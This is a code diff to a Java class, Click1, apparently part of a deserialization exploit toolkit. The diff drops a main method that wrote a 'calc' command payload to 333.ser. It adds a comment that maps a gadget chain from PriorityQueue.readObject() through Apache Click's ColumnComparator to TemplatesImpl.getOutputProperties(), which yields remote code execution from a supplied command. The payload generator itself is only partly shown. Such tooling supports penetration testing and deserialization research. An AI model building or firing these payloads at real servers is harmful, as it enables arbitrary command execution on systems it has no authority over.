@@ -7,20 +7,44 @@ import org.apache.click.control.Column;
 import org.apache.click.control.Table;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
+/**
+ *     Apache Click chain based on arbitrary getter calls in PropertyUtils.getObjectPropertyValue().
+ *     We use java.util.PriorityQueue to trigger ColumnComparator.compare().
+ *     After that, ColumnComparator.compare() leads to TemplatesImpl.getOutputProperties() via unsafe reflection.
+ *
+ *     Chain:
+ *
+ *     java.util.PriorityQueue.readObject()
+ *       java.util.PriorityQueue.heapify()
+ *         java.util.PriorityQueue.siftDown()
+ *           java.util.PriorityQueue.siftDownUsingComparator()
+ *             org.apache.click.control.Column$ColumnComparator.compare()
+ *               org.apache.click.control.Column.getProperty()
+ *                 org.apache.click.control.Column.getProperty()
+ *                   org.apache.click.util.PropertyUtils.getValue()
+ *                     org.apache.click.util.PropertyUtils.getObjectPropertyValue()
+ *                       java.lang.reflect.Method.invoke()
+ *                         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
+ *                         ...
+ *
+ *     Arguments:
+ *     - command to execute
+ *
+ *     Yields:
+ *     - RCE via TemplatesImpl.getOutputProperties()
+ *
+ *     Requires:
+ *     - Apache Click
+ *     - servlet-api of any version
+ *
+ *     by @artsploit
+ */
 public class Click1 {
-
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         // prepare a Column.comparator with mock values
